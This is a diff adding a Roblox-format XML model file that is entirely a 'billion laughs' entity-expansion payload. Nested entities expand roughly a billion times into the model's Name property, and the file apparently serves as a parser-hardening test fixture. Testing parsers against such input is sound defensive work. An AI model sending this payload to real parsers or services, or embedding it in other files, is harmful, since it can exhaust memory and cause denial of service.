@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<!DOCTYPE roblox [
+<!ENTITY laugh "ha">
+<!ENTITY a "&laugh;&laugh;&laugh;&laugh;&laugh;&laugh;&laugh;&laugh;&laugh;&laugh;">
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+]>
+<roblox version="4"><Item class="Model"><Properties><string name="Name">&i;</string></Properties></Item></roblox>
